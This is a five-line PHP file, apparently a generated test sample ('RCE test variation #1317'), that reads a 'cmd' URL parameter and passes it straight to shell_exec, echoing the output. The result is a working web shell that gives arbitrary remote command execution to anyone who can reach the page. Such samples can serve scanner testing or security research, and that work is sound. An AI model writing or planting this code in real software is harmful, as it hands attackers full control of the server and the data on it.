<?php
// RCE test variation #1317
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>